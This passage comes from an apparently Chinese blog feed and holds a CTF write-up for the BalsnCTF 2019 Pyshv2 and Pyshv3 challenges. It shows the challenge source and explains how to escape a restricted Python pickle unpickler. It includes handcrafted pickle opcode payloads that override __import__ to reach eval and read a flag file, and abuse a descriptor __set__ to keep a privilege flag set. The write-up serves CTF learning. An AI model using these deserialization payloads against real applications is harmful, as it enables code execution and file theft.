class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        module = __import__(module)</span><br><span class="line">        <span class="keyword">return</span> getattr(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py 为空</span></span><br></pre></td></tr></table></figure><p>真会玩，给你一个空模块：），先看下空模块有哪些内置方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs = __import__(<span class="string">'structs'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs</span><br><span class="line">&lt;module <span class="string">'structs'</span> <span class="keyword">from</span> <span class="string">'C:\\Users\\wywwzjj\\structs.py'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(structs)</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__cached__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__builtins__'</span>)[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p>好了，问题又转变为如何获取键值，还是比较艰难。</p><p>查文档时又发现了一个东西，原来 <code>__import__</code> 可被覆盖。</p><blockquote><p><code>__import__</code>(<em>name</em>, <em>globals=None</em>, <em>locals=None</em>, <em>fromlist=()</em>, <em>level=0</em>)</p><p>此函数会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义，但是 <strong>强烈</strong> 不建议这样做，因为使用导入钩子 (参见 <a href="https://www.python.org/dev/peps/pep-0302" target="_blank" rel="noopener"><strong>PEP 302</strong></a>) 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#__import__" target="_blank" rel="noopener"><code>__import__()</code></a> 而应该用 <a href="https://docs.python.org/zh-cn/3/library/importlib.html#importlib.import_module" target="_blank" rel="noopener"><code>importlib.import_module()</code></a>。</p></blockquote><p>那该覆盖成什么函数呢？最好是 <code>__import__(module)</code> 后能返回字典的函数。</p><p>只能从内置函数下手了，一个一个试吧，发现没一个能用的。</p><p>后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。</p><p><a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" rel="noopener">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g802k3rxitj20gz0p0q4f.jpg" alt="image.png"></p><p>这个 <code>__getattribute__</code> 恰好能符合我们的要求，真棒。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__getattribute__'</span>)(<span class="string">'__builtins__'</span>)</span><br><span class="line">&#123;'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;),...</span><br></pre></td></tr></table></figure><p>再理下思路：（伪代码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = getattr(structs, <span class="string">'__builtins__'</span>)   <span class="comment"># 获取到字典，先存起来</span></span><br><span class="line">getattr(structs, <span class="string">'__import__'</span>) = getattr(structs, <span class="string">'__getattribute__'</span>)  <span class="comment"># 覆盖 __import__</span></span><br><span class="line">setattr(structs, <span class="string">'structs'</span>, d)   <span class="comment"># 创建个 structs 的属性，字典写入该属性</span></span><br><span class="line">mo = __import__(structs) <span class="comment"># 此时的 mo 就是我们之前的 __builtins__</span></span><br><span class="line">getattr(mo, <span class="string">'get'</span>)     <span class="comment"># 获取到 get 方法，然后就可以按照 pyshv1 的思路来了</span></span><br></pre></td></tr></table></figure><p>转换为 pickle：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">p100</span><br><span class="line"><span class="number">0</span>cstructs</span><br><span class="line">__dict__</span><br><span class="line">S<span class="string">'structs'</span></span><br><span class="line">cstructs</span><br><span class="line">__builtins__<span class="meta"># 先添加 structs 属性</span></span><br><span class="line">p101</span><br><span class="line">sg101</span><br><span class="line">S<span class="string">'__import__'</span></span><br><span class="line">g100</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S<span class="string">'eval'</span></span><br><span class="line">tR(S<span class="string">'print(open("../flag").read())'</span>   <span class="meta"># 这里已经不能 __import__(<span class="string">'os'</span>) 了，能继续执行命令吗：）</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'whoami'</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">'su'</span>: self.cmd_su,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'../flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.key, flag))</span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        print(<span class="string">'Login as '</span> + user.name + <span class="string">' - '</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            print(<span class="string">'flag: Permission denied'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, group)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">''</span></span><br></pre></td></tr></table></figure><p><code>RestrictedUnpickler</code> 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。</p><p>注意到，在 <code>cmd_flag()</code> 中，<code>self.user.privileged</code> 只要就符合条件将输出 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">user.privileged = <span class="literal">False</span>  <span class="comment"># 这个有点猛，后面还有赋值，没法直接覆盖了</span></span><br></pre></td></tr></table></figure><p>魔术方法列表中可以看到，给属性赋值时，用的是 <code>__setattr__(self, name)</code>，能不能把这个干掉？</p><p>看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 <code>privileged</code> ，同时又不干扰 <code>flag</code>？</p><p>继续在魔术方法里寻找，突然看到了一个<code>创建描述符对象</code>里有 <code>__set__</code> 方法，会不会有点关系呢。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g80iq605w2j20hd0gcdgu.jpg" alt="image.png"></p><blockquote><p>属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，<code>a.x</code> 的查找顺序会从 <code>a.__dict__[&#39;x&#39;]</code> 开始，然后是 <code>type(a).__dict__[&#39;x&#39;]</code>，接下来依次查找 <code>type(a)</code> 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则 Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。 </p></blockquote><p>关于描述符的讲解还可以看下这文章：<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">https://foofish.net/what-is-descriptor-in-python.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RevealAccess</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A data descriptor that sets and returns values</span></span><br><span class="line"><span class="string">       normally and prints a message logging their access.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initval=None, name=<span class="string">'var'</span>)</span>:</span></span><br><span class="line">        self.val = initval</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, obj, objtype)</span>:</span></span><br><span class="line">        print(<span class="string">'Retrieving'</span>, self.name)</span><br><span class="line">        <span class="keyword">return</span> self.val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        print(<span class="string">'Updating'</span>, self.name)</span><br><span class="line">        self.val = val</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    x = RevealAccess(<span class="number">10</span>, <span class="string">'var "x"'</span>)</span><br><span class="line"><span class="meta">... </span>    y = <span class="number">5</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = MyClass()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x = <span class="number">20</span></span><br><span class="line">Updating var <span class="string">"x"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.y</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><p>可清楚的看到，对属性 <code>x</code> 的操作都被 “hook” 住了，而 <code>y</code> 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的 <code>RevealAccess</code>，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">m = MyClass()</span><br><span class="line">MyClass.x = m</span><br><span class="line">print(m.x)</span><br><span class="line">m.y = <span class="number">6</span></span><br><span class="line">print(m.y)</span><br><span class="line">m.x = <span class="number">3</span></span><br><span class="line">print(m.x)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>把这个过程转为 pickle：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(<span class="name">I111</span></span><br><span class="line">I222</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(<span class="name">N</span>&#125;S'__set__'</span><br><span class="line">g100</span><br><span class="line">sS'privileged'</span><br><span class="line">g101</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>看一下结果：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g81bht0kk3j20sr0ifwfr.jpg" alt="image.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><p><a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn 一次性搞了三个，太强了，学到了很多，感谢这些
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 存储器层次结构 笔记</title>
    <link href="https://wywwzjj.top/2019/10/21/CSAPP-Chapter-6-Notes/"/>
    <id>https://wywwzjj.top/2019/10/21/CSAPP-Chapter-6-Notes/</id>
    <published>2019-10-21T12:30:19.000Z</published>
    <updated>2019-11-17T13:12:13.308Z</updated>
    
